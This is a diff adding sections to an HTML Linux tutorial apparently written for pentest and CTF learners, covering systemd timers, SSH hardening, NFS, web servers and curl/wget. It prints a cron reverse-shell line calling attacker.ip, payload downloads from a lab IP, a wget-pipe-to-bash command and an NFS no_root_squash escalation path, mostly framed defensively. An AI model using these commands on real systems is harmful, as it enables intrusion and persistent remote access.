+<span class="pr">root@target[~]#</span> <span class="ct">systemctl enable --now mytask.timer</span><br><br>
+<span class="cc"># View all active timers and when they next fire</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">systemctl list-timers --all</span>
+          </div>
+        </div>
+        <div class="note-box warn"><span class="ni">⚠️</span><div class="nt"><strong>Cron as a persistence mechanism</strong>Attackers add callback lines to crontabs: <code>* * * * * bash -i &gt;&amp; /dev/tcp/attacker.ip/4444 0&gt;&amp;1</code> — this runs a reverse shell every minute. During incident response, audit all crontabs: user crontabs in <code>/var/spool/cron/crontabs/</code>, <code>/etc/crontab</code>, <code>/etc/cron.d/</code>, and <code>systemctl list-timers --all</code>.</div></div>
+        <div class="note-box good"><span class="ni">🔍</span><div class="nt"><strong>cron vs systemd timers — when to use which</strong>Use <strong>cron</strong> for simple recurring jobs — it's universally available and easy to read. Use <strong>systemd timers</strong> when you need dependencies (e.g. only run after network is up), event triggers, or want logs through journalctl. Both are valid in production.</div></div>
+      </div>
+    </div>
+
+    <!-- P2-09: Network Services -->
+    <div class="section-card">
+      <div class="card-header"><div class="card-icon icon-purple">🌐</div><div class="card-title">Network Services — SSH Config, NFS, Web Servers</div><div class="card-num">19 / 20</div></div>
+      <div class="card-body">
+        <p>Linux systems regularly run <span class="hi">network services</span> that accept remote connections — SSH for admin access, NFS for shared filesystems, web servers for delivering content. Understanding how to install, configure, and interact with these services matters both as an admin and as someone assessing them for security weaknesses.</p>
+
+        <div class="sec-label" style="margin-top:4px;">SSH Server — Configuration</div>
+        <p>Part 1 covered connecting <em>to</em> SSH. The server side is controlled through <code>/etc/ssh/sshd_config</code>. Misconfigurations here — like allowing root login or password auth — are a significant attack surface.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — SSH server setup and hardening</span></div>
+          <div class="cmd-content">
+<span class="cc"># Install OpenSSH server</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt install openssh-server -y</span><br><br>
+<span class="cc"># Check that it's running</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">systemctl status ssh</span><br>
+<span class="out">   Active: <span class="oh">active (running)</span> since Mon 2024-03-11 10:22:03 UTC</span><br><br>
+<span class="cc"># Key security settings in /etc/ssh/sshd_config</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo nano /etc/ssh/sshd_config</span><br>
+<span class="out oh">PermitRootLogin no</span>           <span class="cc"># never allow direct root SSH</span><br>
+<span class="out oh">PasswordAuthentication no</span>    <span class="cc"># keys only, disable password auth</span><br>
+<span class="out oh">Port 2222</span>                     <span class="cc"># change from default port 22</span><br>
+<span class="out oh">MaxAuthTries 3</span>               <span class="cc"># limit brute-force attempts</span><br><br>
+<span class="cc"># Apply config changes by restarting the service</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo systemctl restart ssh</span>
+          </div>
+        </div>
+
+        <div class="sec-label">NFS — Network File System</div>
+        <p><span class="hi">NFS</span> lets you mount a remote directory over the network as if it were local. Common in enterprise environments, and exploitable when misconfigured — especially with <code>no_root_squash</code>, which allows remote root to act as local root on the share.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — NFS server config and client mount</span></div>
+          <div class="cmd-content">
+<span class="cc"># Server: install and start NFS</span><br>
+<span class="pr">root@server[~]#</span> <span class="ct">sudo apt install nfs-kernel-server -y</span><br>
+<span class="pr">root@server[~]#</span> <span class="ct">sudo systemctl start nfs-kernel-server</span><br><br>
+<span class="cc"># Define what to share in /etc/exports</span><br>
+<span class="pr">root@server[~]#</span> <span class="ct">echo '/home/JohnDoe/share 10.10.14.0/24(rw,sync,no_root_squash)' &gt;&gt; /etc/exports</span><br>
+<span class="pr">root@server[~]#</span> <span class="ct">exportfs -ra</span>  <span class="cc"># apply changes without restarting</span><br><br>
+<span class="cc"># Client: mount the NFS share locally</span><br>
+<span class="pr">JohnDoe@client[~]$</span> <span class="ct">mkdir ~/nfs_mount</span><br>
+<span class="pr">JohnDoe@client[~]$</span> <span class="ct">mount 10.10.14.5:/home/JohnDoe/share ~/nfs_mount</span><br>
+<span class="pr">JohnDoe@client[~]$</span> <span class="ct">ls ~/nfs_mount</span>
+          </div>
+        </div>
+        <table class="styled-table">
+          <thead><tr><th>Export Option</th><th>What it does</th></tr></thead>
+          <tbody>
+            <tr><td>rw</td><td>Allow read and write on the share</td></tr>
+            <tr><td>ro</td><td>Read-only access only</td></tr>
+            <tr><td>sync</td><td>Write to disk before confirming — safer, slightly slower</td></tr>
+            <tr><td>async</td><td>Faster but risks data loss on crash</td></tr>
+            <tr><td>root_squash</td><td>Maps remote root to anonymous user — default, safer</td></tr>
+            <tr><td>no_root_squash</td><td>Remote root keeps root privileges on the share — dangerous</td></tr>
+          </tbody>
+        </table>
+
+        <div class="sec-label">Web Servers — Apache &amp; Python</div>
+        <p><span class="hi">Apache2</span> is the full production web server. <span class="hi-g">Python's http.server</span> is a single-command instant file server — invaluable for quickly hosting files, payloads, or scripts during testing without any configuration.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL</span></div>
+          <div class="cmd-content">
+<span class="cc"># Install and start Apache2</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo apt install apache2 -y</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">sudo systemctl start apache2</span><br>
+<span class="out">Web root: <span class="oh">/var/www/html/</span>  — drop files here to serve them</span><br><br>
+<span class="cc"># Quick one-liner — serve current directory on port 8000</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">python3 -m http.server</span><br>
+<span class="out">Serving HTTP on 0.0.0.0 port <span class="oh">8000</span> (http://0.0.0.0:8000/) ...</span><br><br>
+<span class="cc"># Serve a specific folder on a custom port</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">python3 -m http.server 443 --directory /tmp/payloads/</span>
+          </div>
+        </div>
+        <div class="note-box warn"><span class="ni">⚠️</span><div class="nt"><strong>no_root_squash is a privilege escalation path</strong>When an NFS export uses <code>no_root_squash</code>, a client mounting the share as root can create SUID binaries in it. If those binaries can be executed on the NFS server, it's a direct route to root. Always audit <code>/etc/exports</code> during enumeration — <code>no_root_squash</code> on a writable share is a critical finding.</div></div>
+        <div class="note-box tip"><span class="ni">💡</span><div class="nt"><strong>OpenVPN — connecting to lab environments</strong>When lab environments require a VPN connection, OpenVPN is the standard. Install with <code>sudo apt install openvpn -y</code> and connect with <code>sudo openvpn --config your.ovpn</code>. Your VPN IP will appear as a new interface (typically <code>tun0</code>), visible in <code>ip a</code>.</div></div>
+      </div>
+    </div>
+
+    <!-- P2-10: Web Transfer Tools -->
+    <div class="section-card">
+      <div class="card-header"><div class="card-icon icon-dim">📡</div><div class="card-title">Web Transfer Tools — curl, wget</div><div class="card-num">20 / 20</div></div>
+      <div class="card-body">
+        <p><span class="hi">curl</span> and <span class="hi">wget</span> are your command-line interfaces to the web. They let you interact with HTTP/HTTPS servers, download files, send requests, and inspect server responses — all from the terminal. These tools appear constantly in automation, scripting, recon, and file transfer during assessments.</p>
+        <p>Key difference in default behavior: <strong>curl prints to STDOUT</strong>, <strong>wget saves to disk</strong>. Both can do either with the right flags.</p>
+
+        <div class="sec-label" style="margin-top:4px;">curl — Transfer Data Over Any Protocol</div>
+        <p>Think of curl as a programmable browser for the terminal. It supports HTTP, HTTPS, FTP, SFTP, and more. You can read responses, send POST data, set custom headers, follow redirects, and inspect certificates — all from a single command.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — curl examples</span></div>
+          <div class="cmd-content">
+<span class="cc"># Fetch a webpage — prints HTML to STDOUT</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">curl http://10.10.14.5</span><br>
+<span class="out">&lt;!DOCTYPE html&gt;&lt;html&gt;...&lt;/html&gt;</span><br><br>
+<span class="cc"># View response headers only (-I = HEAD request, no body)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">curl -I http://10.10.14.5</span><br>
+<span class="out oh">HTTP/1.1 200 OK</span><br>
+<span class="out">Server: Apache/2.4.62 (Debian)</span><br>
+<span class="out">Content-Type: text/html</span><br><br>
+<span class="cc"># Save output to a specific file</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">curl http://10.10.14.5/linpeas.sh -o linpeas.sh</span><br><br>
+<span class="cc"># Follow HTTP redirects automatically (-L)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">curl -L http://10.10.14.5/redirect</span><br><br>
+<span class="cc"># Send a POST request with form data</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">curl -X POST -d "username=admin&amp;password=admin" http://10.10.14.5/login</span><br><br>
+<span class="cc"># Set a custom header (e.g. for API auth or user-agent spoofing)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">curl -H "Authorization: Bearer token123" http://10.10.14.5/api/users</span><br><br>
+<span class="cc"># Send a JSON body (REST API)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">curl -X POST -H "Content-Type: application/json" -d '{"user":"admin"}' http://10.10.14.5/api</span>
+          </div>
+        </div>
+
+        <div class="sec-label">wget — Download Files</div>
+        <p><code>wget</code> is designed for downloading. Unlike curl, it <strong>saves to disk automatically</strong> with a progress bar, and handles retries on interrupted downloads. Better than curl for batch downloads or when you just need a file saved reliably.</p>
+        <div class="cmd-block">
+          <div class="cmd-bar"><div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div><span class="cmd-lbl">TERMINAL — wget examples</span></div>
+          <div class="cmd-content">
+<span class="cc"># Download a file (saves with the original filename)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">wget http://10.10.14.5/linpeas.sh</span><br>
+<span class="out">Saving to: <span class="oh">'linpeas.sh'</span></span><br>
+<span class="out">linpeas.sh   100%[=====>]  822K  3.40MB/s  in 0.2s</span><br><br>
+<span class="cc"># Save with a custom filename (-O)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">wget http://10.10.14.5/file.bin -O exploit.bin</span><br><br>
+<span class="cc"># Download quietly — suppress all output (-q)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">wget -q http://10.10.14.5/payload.sh</span><br><br>
+<span class="cc"># Quiet download piped directly to bash (-O- outputs to STDOUT)</span><br>
+<span class="pr">JohnDoe@target[~]$</span> <span class="ct">wget -qO- http://10.10.14.5/setup.sh | bash</span>
+          </div>
+        </div>
+
+        <table class="styled-table">
+          <thead><tr><th>Command</th><th>Output behavior</th><th>Best for</th></tr></thead>
+          <tbody>
+            <tr><td>curl URL</td><td>Prints to STDOUT (terminal)</td><td>API calls, inspecting responses, piping output</td></tr>
+            <tr><td>curl -o file URL</td><td>Saves to named file</td><td>Downloading with a custom filename</td></tr>
+            <tr><td>curl -I URL</td><td>Headers only</td><td>Server fingerprinting, checking redirects</td></tr>
+            <tr><td>wget URL</td><td>Saves to disk automatically</td><td>Reliable file downloads, original filename preserved</td></tr>
+            <tr><td>wget -qO- URL</td><td>Prints to STDOUT (quiet)</td><td>Piping downloaded content to another command</td></tr>
+          </tbody>
+        </table>
+        <div class="note-box good"><span class="ni">🛠️</span><div class="nt"><strong>Standard file transfer pattern</strong>The classic CTF / pentest workflow: on your attacking machine run <code>python3 -m http.server 8080</code>, then on the target run <code>wget http://your-ip:8080/tool</code> or <code>curl http://your-ip:8080/tool -o tool</code>. No FTP setup, no SCP keys — just HTTP. Works whenever you have outbound web access on the target.</div></div>
+        <div class="note-box warn"><span class="ni">⚠️</span><div class="nt"><strong>Never blindly pipe from the internet to bash</strong><code>curl url | bash</code> is a common installer pattern, but it executes whatever code exists at that URL without any review. If the server is compromised or the URL is intercepted (MITM), you're running arbitrary code as yourself — or worse, as root if you prepended sudo. Always download first, inspect the script, then execute.</div></div>
+      </div>
+    </div>
+
+    <div class="divider">── end of part 2 · sections 11–20 ──</div>
   </div><!-- end panel1 -->
 
   <!-- PART 3 PANEL -->
